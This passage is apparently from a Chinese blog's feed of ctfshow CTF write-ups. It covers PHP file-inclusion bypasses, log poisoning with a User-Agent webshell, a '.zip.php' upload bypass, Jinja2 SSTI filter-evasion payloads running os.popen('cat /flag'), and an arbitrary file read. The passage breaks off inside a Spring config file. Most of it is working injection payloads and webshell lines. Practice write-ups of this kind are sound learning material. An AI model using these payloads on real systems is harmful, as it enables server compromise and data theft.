class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) <br></code></pre></td></tr></table></figure><p>只检查了第二部分是否为<code>zip</code>，所以构造一句话木马文件名为<code>啥都行.zip.php</code>即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow做题记录[未完成]</title>
    <link href="/2024/03/01/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_SSTI/"/>
    <url>/2024/03/01/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_SSTI/</url>
    
    <content type="html"><![CDATA[<p>一些做题记录</p><span id="more"></span><hr><h2 id="文件包含部分："><a href="#文件包含部分：" class="headerlink" title="文件包含部分："></a>文件包含部分：</h2><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>无任何过滤：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>过滤了php，直接读文件是不行了，考虑<code>data</code>伪协议执行命令(base64编码)：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="language-xml">//</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac f*`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>就是利用<code>php</code>里的短标签。<code>&lt;?= ?&gt;</code>相当于<code>&lt;?php echo ?&gt;</code></p><p>另外<code>str_replace</code>是区分大小写的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;phpPHPpHpPhP&quot;</span>;<br><span class="hljs-variable">$file1</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;----------------&#x27;</span>;<br><span class="hljs-variable">$file2</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file2</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：???PHPpHpPhP----------------????????????</span><br></code></pre></td></tr></table></figure><p>所以解法还有：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-title class_">Php</span><span class="hljs-symbol">://input</span><br><br><span class="hljs-variable constant_">POST</span>执行的数据<br></code></pre></td></tr></table></figure><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>过滤了<code>data</code>和<code>php</code>的大小写。。这里要用远程包含&#x2F;日志包含：</p><p><a href="https://drinkflower.asia/wordpress/archives/442">日志包含</a></p><p>个人理解就是通过<code>include</code>和日志文件中的特定内容配合(include把啥东西都当php读)</p><p>日志文件常见路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache/</span>access.log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>error.log<br></code></pre></td></tr></table></figure><p>只有第二个有正常的回显：</p><p><img src="/img/ctfshow80.png" alt="ctfshow80"></p><p>存在<code>UA</code>头，所以直接把<code>UA</code>头修改成：</p><p> 1.<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>，<code>&lt;?php system(&#39;cat fl0g.php&#39;);?&gt;</code>传过去再刷新下网页就行</p><p>2.<code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code> <code>a=system(&#39;cat fl0g.php&#39;);</code></p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>比之前多了个<code>:</code>，还是上一题的日志包含(主要是禁了input那个方法)。</p><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p><code>/i</code>模式匹配的大小写，<code>=</code>也被过滤了。这里还是用<code>79</code>那里的<code>data</code>伪协议执行命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4=  <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br>?file=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br><span class="hljs-comment">//因为等号被过滤了所以转base64后再去掉等号</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h2 id="SSTI部分："><a href="#SSTI部分：" class="headerlink" title="SSTI部分："></a>SSTI部分：</h2><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>无任何过滤:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>同上：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>应该是过滤了单引号双引号：</p><p>头要么用<code>config</code>，要么用<code>()</code>，过滤了引号可以(这个单双引号好像没法用十六进制去表示)：</p><p><img src="/img/ctfshowweb363_1.png" alt="ctfshowweb363_1"></p><p>把之前<code>payload</code>中带引号的都放到<code>request.args.path</code>中就行：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[request.args.x1].popen(<span class="hljs-name">request.args.x2</span>).read()&#125;&#125;</span><span class="language-xml">&amp;x1=os&amp;x2=cat /flag</span><br></code></pre></td></tr></table></figure><h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>应该是在上题的基础上过滤了<code>args</code>，搜了下还可以用<code>cookie传值</code>：</p><p><a href="https://blog.csdn.net/miuzzx/article/details/112168039">参考文章</a></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload</span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x.__init__.__globals__</span>[request.cookies.x1].eval(<span class="hljs-name">request.cookies.x2</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">cookie传值</span><br><span class="language-xml">Cookie:x1=__builtins__;x2=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>这个x当开头第一次见：</p><p><img src="/img/ctfshowweb364_1.png" alt="ctfshowweb364_1"></p><p><code>config</code>的话类中__init__函数全局变量中已经导入了”os”模块，可以直接调用。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[request.cookies.x1].popen(<span class="hljs-name">request.cookies.x2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//hackbar直接传：</span><br><span class="language-xml">Cookie:  x1=os;x2=cat /flag //Cookie不用加</span><br></code></pre></td></tr></table></figure><h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>在之前的基础上过滤了中括号：</p><p><code>__getitem__</code> 方法是 Python 对象的一个内建方法，当你使用中括号 <code>[]</code> 来访问对象的元素时，实际上是调用了这个方法。</p><p>对于字典来说，使用 <code>__getitem__</code> 方法，你可以这样获取字典中的键值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br>result = my_dict.__getitem__(<span class="hljs-string">&#x27;key1&#x27;</span>)  <span class="hljs-comment"># 或者直接写作 result = my_dict[&#x27;key1&#x27;]</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>所以：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.x1</span>).popen(<span class="hljs-name">request.cookies.x2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//hackbar直接传：</span><br><span class="language-xml">Cookie:  x1=os;x2=cat /flag //Cookie不用加</span><br></code></pre></td></tr></table></figure><h2 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h2><p>过滤了下划线：</p><p><a href="https://blog.csdn.net/miuzzx/article/details/112168039">参考文章</a></p><p>使用 <code>foo|attr(&quot;bar&quot;)</code> 可以获取对象 <code>foo</code> 的属性 <code>bar</code> 的值，类似于 <code>foo.bar</code> 的用法。</p><p>所以：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">x</span>|attr(<span class="hljs-name">request.cookies.x1</span>)|attr(<span class="hljs-name">request.cookies.x2</span>)|attr(<span class="hljs-name">request.cookies.x3</span>))(<span class="hljs-name">request.cookies.x4</span>).eval(<span class="hljs-name">request.cookies.x5</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>简单说还是利用请求参数进行逃逸</p><h2 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h2><p>同上</p><h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>又过滤了双大括号，但<code>&#123;%%&#125;</code>这东西并没有过滤。</p><p><a href="https://blog.csdn.net/weixin_73051164/article/details/132574970">参考文章</a></p><p>不过注意要加上<code>print</code>，不然只会执行命令，没回显。在上一题基础上修改就行：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/?name<span class="hljs-operator">=</span>&#123;<span class="hljs-variable">%print</span>((<span class="hljs-keyword">x</span>|attr(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">1</span>)|attr(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">2</span>)|attr(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">3</span>))(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">4</span>).eval(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">5</span>))%&#125;<br><br>Cookie:<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-operator">=</span>__init__<span class="hljs-comment">;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>还有其它解法(其实就是把上面的拆开了：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">name=&#123;%set aaa=(x|attr(request.cookies.<span class="hljs-keyword">in</span>)|attr(request.cookies.gl)|attr(request.cookies.ge))(request.cookies.bu)%&#125;&#123;% <span class="hljs-keyword">print</span>(aaa.<span class="hljs-keyword">eval</span>(request.cookies.cmd))%&#125;<br><br><span class="hljs-keyword">in</span>=init;gl=globals;ge=getitem;bu=builtins;cmd=import(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-keyword">popen</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>又过滤了<code>request</code>，直接抄了yu师傅的：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">?name=</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> po=dict(po=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ini=(a,a,dict(init=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> glo=(a,a,dict(globals=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> geti=(a,a,dict(getitem=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> built=(a,a,dict(builtins=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> x=(q<span class="hljs-punctuation">|</span>attr(ini)<span class="hljs-punctuation">|</span>attr(glo)<span class="hljs-punctuation">|</span>attr(geti))(built)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chr=x.chr<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> file=chr(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">103</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(x.open(file).read())<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="反序列化部分"><a href="#反序列化部分" class="headerlink" title="反序列化部分"></a>反序列化部分</h2><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><h2 id="web580"><a href="#web580" class="headerlink" title="web580"></a>web580</h2><h2 id="838"><a href="#838" class="headerlink" title="838"></a>838</h2><p><img src="/img/838_1.png" alt="838_1"></p><p>存在任意文件下载，本来想读<code>/proc/self/environ</code>看当前工作目录的，结果直接把flag读了：</p><p><img src="/img/838_2.png" alt="838_2"></p><p>看<code>web.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 应用程序显示名称 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 上下文参数配置 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 监听器配置 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 过滤器配置 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>charset<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>utf-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 过滤器映射 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>charset<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Servlet 配置 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/dispatcher-servlet.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Servlet 映射 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>dispatcher-servlet.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:annotation-driven</span>/&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/layui/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/WEB-INF/static/layui/&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/images/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/WEB-INF/static/images/&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/css/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/WEB-INF/static/css/&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:default-servlet-handler</span> /&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span 